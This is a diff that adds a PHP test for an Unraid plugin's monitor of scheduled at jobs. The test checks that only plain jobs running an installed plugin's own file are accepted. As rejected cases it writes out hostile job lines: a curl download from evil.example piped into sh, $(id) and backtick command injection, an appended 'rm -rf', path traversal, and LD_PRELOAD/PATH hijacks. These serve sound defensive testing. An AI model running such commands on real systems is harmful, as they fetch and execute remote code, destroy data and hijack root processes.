@@ -7299,6 +7299,117 @@ function testWatchmanAtUserScript(): void
 }
 
 /**
+ * A plugin's own at job (Benj, 2026-10-09: Fix Common Problems' disks_mounted event queues
+ * `echo "/usr/local/emhttp/plugins/fix.common.problems/scripts/scan.php" | at now +10 min -M`): a plain line in the
+ * book naming the plugin, noted by himself — only when the job is exactly one file of an installed plugin's folder
+ * (optionally after php or bash, plain arguments), as root, with an environment that can't run something else.
+ * Anything else stays an at_job; open at_job entries of that shape are closed.
+ */
+function testWatchmanAtPlugin(): void
+{
+    $tmp = sys_get_temp_dir() . '/office-tests-atpl-' . getmypid();
+    $src = "$tmp/src";
+    $data = "$tmp/data";
+    foreach (['crontabs', 'cron.d', 'logplugins', 'atjobs', 'agents', 'extra', 'ssh', 'flash/user.scripts/scripts', 'emhttp/fix.common.problems/scripts',
+              'emhttp/plain.readme', 'emhttp/odd.readme'] as $d) {
+        @mkdir("$src/$d", 0700, true);
+    }
+    file_put_contents("$src/logplugins/fix.common.problems.plg", "<PLUGIN name=\"fix.common.problems\" version=\"2026.05.16\">\n");
+    file_put_contents("$src/emhttp/fix.common.problems/README.md", "####Fix Common Problems####\nA Plugin to diagnose and suggest fixes for common problems\n");
+    file_put_contents("$src/emhttp/plain.readme/README.md", "**Plain Readme**\n");
+    file_put_contents("$src/emhttp/odd.readme/README.md", "<script>x</script>\n");
+    // the head at writes for root in an event script (cwd /), with and without at's SHELL wrapper
+    $head = fn (string $env = '', int $uid = 0) => "#!/bin/sh\n# atrun uid=$uid gid=0\n# mail root 0\numask 22\nSHELL=/bin/bash; export SHELL\nPWD=/; export PWD\n"
+        . "HOME=/root; export HOME\nPATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin; export PATH\n$env"
+        . "cd / || {\n\t echo 'Execution directory inaccessible' >&2\n\t exit 1\n}\n";
+    $wrap = fn (string $cmds) => "\${SHELL:-/bin/sh} << 'marcinDELIMITER6f1e2d3c'\n$cmds\nmarcinDELIMITER6f1e2d3c\n";
+    $scan = '/usr/local/emhttp/plugins/fix.common.problems/scripts/scan.php';
+    $is = fn (string $job) => watchmanAtPlugin($job, "$src/logplugins");
+    same('at plugin: Fix Common Problems\' scan and extended test (as it queues them; after php, /usr/bin/php, bash; plain arguments)',
+        array_fill(0, 6, 'fix.common.problems'),
+        [$is($head() . $wrap($scan)), $is($head() . "$scan\n"), $is($head() . $wrap('/usr/local/emhttp/plugins/fix.common.problems/scripts/extendedTest.php')),
+         $is($head() . $wrap("php $scan")), $is($head() . $wrap("/usr/bin/php $scan --quiet run=1")), $is($head() . $wrap('bash /usr/local/emhttp/plugins/fix.common.problems/scripts/x.sh'))]);
+    same('at plugin: anything else is not', array_fill(0, 17, null), [
+        $is($head() . $wrap('/usr/local/emhttp/plugins/evil.plugin/scripts/x.sh')),                       // not an installed plugin
+        $is($head() . $wrap('/usr/local/emhttp/plugins/fix.common.problems.plg')),                        // no file in its folder
+        $is($head() . $wrap("$scan; curl -s https://evil.example/x | sh")),                               // shell metacharacters
+        $is($head() . $wrap("$scan & ")),
+        $is($head() . $wrap("$scan | sh")),
+        $is($head() . $wrap("$scan \$(id)")),
+        $is($head() . $wrap("$scan `id`")),
+        $is($head() . $wrap("$scan > /tmp/x")),
+        $is($head() . $wrap("$scan 'quoted'")),
+        $is($head() . $wrap('/usr/local/emhttp/plugins/fix.common.problems/../../../../tmp/x')),          // out of its folder
+        $is($head() . $wrap('/usr/local/emhttp/plugins/fix.common.problems/scripts/../../dynamix/x')),
+        $is($head() . $wrap("python3 $scan")),                                                           // another interpreter
+        $is($head() . $wrap("$scan\n$scan")),                                                            // and more
+        $is($head('', 1000) . $wrap($scan)),                                                             // not as root
+        $is($head("LD_PRELOAD=/tmp/x\\.so; export LD_PRELOAD\n") . $wrap($scan)),                        // an environment that runs something else
+        $is($head("PATH=/tmp/\\.x:/bin; export PATH\n") . $wrap("php $scan")),
+        $is("#!/bin/sh\n$scan\n"),                                                                       // not as at writes it
+    ]);
+    same('at plugin: its name as Unraid shows it (README.md\'s first line), else the plugin\'s', ['Fix Common Problems', 'Plain Readme', 'odd.readme', 'no.readme', 'x'],
+        [watchmanAtPluginName('fix.common.problems', "$src/emhttp"), watchmanAtPluginName('plain.readme', "$src/emhttp"), watchmanAtPluginName('odd.readme', "$src/emhttp"),
+         watchmanAtPluginName('no.readme', "$src/emhttp"), watchmanAtPluginName('x', null)]);
+    $cmd = fn (string $job) => watchmanAtCommand($job);
+    $ub = [watchmanEntry('at_job', 'at_job:a1', 100, ['cmd' => $cmd($head() . $wrap($scan)), 'uid' => 0]),
+           watchmanEntry('at_job', 'at_job:a2', 100, ['cmd' => $cmd($head() . $wrap('/usr/local/emhttp/plugins/evil.plugin/x.sh')), 'uid' => 0]),
+           watchmanEntry('at_job', 'at_job:a3', 100, ['cmd' => $cmd($head() . $wrap($scan)), 'uid' => 1000]),
+           watchmanEntry('at_job', 'at_job:a4', 100, ['cmd' => $cmd($head() . $wrap("$scan " . str_repeat('a', 120))), 'uid' => 0]),
+           watchmanEntry('at_job', 'at_job:a5', 100, ['cmd' => $cmd($head() . $wrap("$scan; rm -rf /x")), 'uid' => 0])];
+    watchmanAtPluginClose($ub, ['fix.common.problems' => []], 200);
+    same('at plugin: an open entry that was only an installed plugin\'s own file, as root, is closed (by plugin), others stay',
+        [['plugin', 200], [null, null], [null, null], [null, null], [null, null]], array_map(fn ($e) => [$e['by'], $e['noted']], $ub));
+
+    // rounds: before 1.48 (or not installed yet) the scan was an alarm; installed, it's a line noted by himself and the
+    // open alarm is closed; a job with more than the plugin's file next to it is told
+    $paths = ['syslog' => "$src/syslog", 'plugins' => "$src/logplugins", 'go' => "$src/go", 'extra' => "$src/extra", 'passwd' => "$src/passwd",
+              'shadow' => "$src/shadow", 'ssh' => "$src/ssh", 'sec' => "$src/sec.ini", 'sec_nfs' => "$src/sec_nfs.ini", 'share_cfg' => "$src/share.cfg",
+              'etc_passwd' => "$src/passwd", 'crontabs' => "$src/crontabs", 'cron_d' => "$src/cron.d", 'cron_files' => "$src/flash",
+              'userscripts' => "$src/flash/user.scripts", 'atjobs' => "$src/atjobs", 'agents' => "$src/agents", 'emhttp_plugins' => "$src/emhttp"];
+    file_put_contents($paths['passwd'], "root:x:0:0::/root:/bin/bash\n");
+    file_put_contents($paths['go'], "#!/bin/bash\n");
+    file_put_contents($paths['syslog'], '');
+    rename("$src/logplugins/fix.common.problems.plg", "$tmp/fcp.plg");
+    $envBefore = getenv('OFFICE_NOTIFY_BIN');
+    putenv("OFFICE_NOTIFY_BIN=$tmp/no-notify");                 // never Unraid's own
+    $now = 1791285000;
+    $docker = fn () => [];
+    $acks = "$tmp/acks.json";
+    touch("$src/logplugins", $now - 100);
+    watchmanRound($paths, $data, 1000, $now, $docker, false, $acks);
+    file_put_contents("$src/atjobs/a000dd01c78c21", $head() . $wrap($scan));
+    touch("$src/atjobs", $now + 10);
+    $r0 = watchmanRound($paths, $data, 1000, $now + 300, $docker, false, $acks);
+    rename("$tmp/fcp.plg", "$src/logplugins/fix.common.problems.plg");
+    touch("$src/logplugins", $now + 350);
+    $r1 = watchmanRound($paths, $data, 1000, $now + 400, $docker, false, $acks);
+    rename("$src/atjobs/a000dd01c78c21", "$src/atjobs/=000dd01c78c21");
+    file_put_contents("$src/atjobs/a000de01c78c40", $head() . $wrap("$scan; curl -s https://evil.example/x | sh"));
+    touch("$src/atjobs", $now + 500);
+    $r2 = watchmanRound($paths, $data, 1000, $now + 600, $docker, false, $acks);
+    $book = watchmanLoad($data)['book'];
+    $pl = array_values(array_filter($book, fn ($e) => $e['kind'] === 'at_plugin'));
+    $old = array_values(array_filter($book, fn ($e) => $e['key'] === 'at_job:a000dd01c78c21'));
+    same('at plugin: not installed — an alarm; installed (a new plugin: told as such) — the alarm closed (by plugin), one line noted by himself, nothing to tell',
+        [['at_job'], ['plugin_new'], 'plugin', false, 1, ['fix.common.problems', 'Fix Common Problems', 'fix.common.problems/scripts/scan.php', 0], 'plugin', false],
+        [$r0['added'], $r1['added'], $old[0]['by'] ?? null, watchmanOpen($old[0] ?? []), count($pl),
+         [$pl[0]['p']['plugin'] ?? null, $pl[0]['p']['name'] ?? null, $pl[0]['p']['file'] ?? null, $pl[0]['p']['uid'] ?? null], $pl[0]['by'] ?? null,
+         watchmanOpen($pl[0] ?? [])]);
+    same('at plugin: running (=) is the same job — still one line; the job with more next to it is an alarm', [['at_job'], 1, 1, ['plugin_new' => 1, 'at_job' => 1]],
+        [$r2['added'], count(array_filter($book, fn ($e) => $e['key'] === 'at_job:a000de01c78c40' && watchmanOpen($e) && ($e['by'] ?? null) === null)), count($pl),
+         watchmanOpenCounts($book)]);
+    same('at plugin: nothing for the team lead (the new plugin and the other job are)', ['plugin_new', 'at_job'], array_column(watchmanFindings($book), 'id'));
+    $page = watchmanPageState($data, $now + 700, false);
+    $row = array_values(array_filter($page['book'], fn ($e) => $e['kind'] === 'at_plugin'))[0] ?? [];
+    same('at plugin: on the page — the plugin named, noted by himself', ['Fix Common Problems', 'fix.common.problems/scripts/scan.php', false, 'plugin', 'sched'],
+        [$row['t']['name'] ?? null, $row['t']['file'] ?? null, $row['open'] ?? null, $row['by'] ?? null, $row['group'] ?? null]);
+    putenv($envBefore === false ? 'OFFICE_NOTIFY_BIN' : "OFFICE_NOTIFY_BIN=$envBefore");
+    @unlink(watchmanLockFile($data, 'book'));
+    exec('rm -rf ' . escapeshellarg($tmp));
+}
+
+/**
  * The night watchman's watch over what starts on its own: root's own crontab next to Unraid's (new
  * lines, lines in both, the office's own lines, programs gone, the syslog as evidence), the plugins'
  * .cron files, User Scripts, atd's queue, the notification agents — all on copies in a temporary folder.
@@ -20804,7 +20915,7 @@ JS);
 // ===================================================================== run
 
 $parts = ['logic' => ['testCron', 'testRetention', 'testPlanGone', 'testSnapPlansTolerant', 'testSleepingPools', 'testSnapshotNames', 'testEmby', 'testEmbyWatch', 'testEmbyImport', 'testOfficeCron', 'testMenuName', 'testEstimates', 'testBackupFirstUpload', 'testNotify', 'testNotifyLayout', 'testCaretakerAcks', 'testAckContent',
-                      'testBackupPackages', 'testBackupKopiaItems', 'testBackupNewLocal', 'testBackupNewLocalOffice', 'testBackupPlace', 'testSetupUnfold', 'testSetupAsleepKept', 'testBackupPresets', 'testBackupSkip', 'testBackupVmOrder', 'testBackupArrayStop', 'testBackupKopiaAutostart', 'testBackupKopiaOrder', 'testAgentBackupHooks', 'testBackupRecoverNotes', 'testBackupEpipe', 'testBackupPartnerPhase', 'testBackupPartnerOffice', 'testBackupAsleep', 'testBackupAsleepOffice', 'testIcons', 'testIconSquare', 'testRestore', 'testRestoreJobs', 'testRestoreShares', 'testRestoreFindings', 'testRestoreDatabases', 'testRestoreDrill', 'testRestorePartner', 'testPartnerTicket', 'testWatchmanTicket', 'testPartnerSendBack', 'testWatchmanPartner', 'testWatchmanNet', 'testSnapshotPartner', 'testCleanupPartner', 'testLogsPartner', 'testAdvisor', 'testAdvisorInstall', 'testAdvisorRecord', 'testAdvisorObjectLock', 'testAdvisorPartnerGuide', 'testLogsTour', 'testMetrics', 'testWatchman', 'testWatchmanGone', 'testWatchmanAtUserScript', 'testWatchmanSched', 'testWatchmanOffice', 'testWatchmanFlow', 'testWatchmanFlowGone', 'testWatchmanPosture', 'testWatchmanSnaps', 'testWatchmanHost', 'testWatchmanNight', 'testWatchmanBoot', 'testNightUi', 'testJobGuard', 'testComposeBuilds', 'testUnraidPath', 'testExclusive',
+                      'testBackupPackages', 'testBackupKopiaItems', 'testBackupNewLocal', 'testBackupNewLocalOffice', 'testBackupPlace', 'testSetupUnfold', 'testSetupAsleepKept', 'testBackupPresets', 'testBackupSkip', 'testBackupVmOrder', 'testBackupArrayStop', 'testBackupKopiaAutostart', 'testBackupKopiaOrder', 'testAgentBackupHooks', 'testBackupRecoverNotes', 'testBackupEpipe', 'testBackupPartnerPhase', 'testBackupPartnerOffice', 'testBackupAsleep', 'testBackupAsleepOffice', 'testIcons', 'testIconSquare', 'testRestore', 'testRestoreJobs', 'testRestoreShares', 'testRestoreFindings', 'testRestoreDatabases', 'testRestoreDrill', 'testRestorePartner', 'testPartnerTicket', 'testWatchmanTicket', 'testPartnerSendBack', 'testWatchmanPartner', 'testWatchmanNet', 'testSnapshotPartner', 'testCleanupPartner', 'testLogsPartner', 'testAdvisor', 'testAdvisorInstall', 'testAdvisorRecord', 'testAdvisorObjectLock', 'testAdvisorPartnerGuide', 'testLogsTour', 'testMetrics', 'testWatchman', 'testWatchmanGone', 'testWatchmanAtUserScript', 'testWatchmanAtPlugin', 'testWatchmanSched', 'testWatchmanOffice', 'testWatchmanFlow', 'testWatchmanFlowGone', 'testWatchmanPosture', 'testWatchmanSnaps', 'testWatchmanHost', 'testWatchmanNight', 'testWatchmanBoot', 'testNightUi', 'testJobGuard', 'testComposeBuilds', 'testUnraidPath', 'testExclusive',
                       'testWhereAfterWatchman', 'testWhereVmStop', 'testBackupSparse', 'testWhereTakeOver', 'testWhereDesk', 'testWhereBuilding', 'testCleanupTick', 'testStaffMerged', 'testStaffOrder', 'testHireWith', 'testMovedDesk', 'testSupporter', 'testLeftovers', 'testOfficeLanguage', 'testThemeSwitch', 'testSizeSwitch', 'testApiLook', 'testLookPage', 'testUpdateNotice', 'testReportDialog', 'testSearchPlaces', 'testSearchItems', 'testSearchGuides', 'testApiGzip', 'testWatchmanApiDoor', 'testCaretakerApi', 'testPartnerPairing', 'testPartnerWatch', 'testPartnerRelease', 'testPartnerUnits', 'testPartnerTolerant', 'testMigrate', 'testBackupReplan', 'testUnraidTested', 'testCronBack', 'testPlgGuard', 'testPlgInstall', 'testPlgRemove', 'testBackupLetGo', 'testApiGetOffline',
                       'testFlockShfs', 'testBackupOneMinute', 'testStrictSettings', 'testRestoreClientEcho'],
           'hardening' => ['testRequestTypes', 'testSafeWrites', 'testAgentRestarted', 'testHeartbeat', 'testDoorbell', 'testSnapshotRecord', 'testTrashManifest', 'testEmbyPaths', 'testAnchors', 'testUpdateClean', 'testAdvisorSecrets', 'testSupporterKeys', 'testPartnerDoor', 'testReport', 'testRunnerNames', 'testSnapshotIds', 'testAgentHired'],
